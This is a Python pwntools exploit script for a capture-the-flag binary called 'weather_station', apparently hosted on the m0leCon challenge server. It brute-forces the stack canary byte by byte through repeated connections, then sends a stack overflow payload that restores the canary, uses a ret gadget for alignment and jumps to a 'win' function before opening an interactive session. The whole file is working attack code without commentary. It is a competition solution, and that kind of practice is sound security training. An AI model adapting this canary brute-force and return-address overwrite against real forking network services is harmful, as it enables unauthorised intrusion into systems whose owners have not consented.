#!/usr/bin/env python3
from pwn import *

exe = ELF('weather_station', checksec=False)
context.binary = exe
context.os = 'linux'
context.arch = 'amd64'

HOST, PORT         = '127.0.0.1', 5555
OFFSECHOST, OFFSECPORT = 'offsec.m0lecon.it', 13580

OFFSET_TO_CANARY = 56
OFFSET_TO_RIP    = 72
GADGET           = 0x000000000040101a

def conn(interactive=False):
    if interactive:
        return remote(HOST, PORT) if args.LOCAL else remote(OFFSECHOST, OFFSECPORT)
    return remote(HOST, PORT, level='error') if args.LOCAL else remote(OFFSECHOST, OFFSECPORT, level='error')

def try_guess(guess):
    r = conn()
    r.recvuntil(b"Enter your location: ")
    r.send(b"AAAA\n")
    r.recvuntil(b"forecast query: ")
    payload = b"A" * OFFSET_TO_CANARY + guess
    r.send(payload)
    try:
        data = r.recv(timeout=0.2)
    except EOFError:
        data = b""
    r.close()
    return b"Forecast sent!" in data

def main():
    if args.CANARY:
        canary = int(args.CANARY, 16)
        log.info(f'Using supplied canary: {canary:#x}')
    else:
        known = b"\x00"
        for i in range(7):
            for bval in range(256):
                guess = known + bytes([bval])
                if try_guess(guess):
                    known = guess
                    log.success(f"byte {i+1}: {bval:02x}")
                    break

        canary = u64(known)
        log.info(f"Canary: {canary:#x}")

    # final exploit
    r = conn(interactive=True)
    r.recvuntil(b"Enter your location: ")
    r.send(b"AAAA\n")
    r.recvuntil(b"forecast query: ")
    payload = flat(
        b"A" * OFFSET_TO_CANARY,
        p64(canary),
        b"B" * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),
        p64(GADGET),
        p64(exe.sym.win),
    )
    r.send(payload)
    r.interactive()

if __name__ == '__main__':
    main()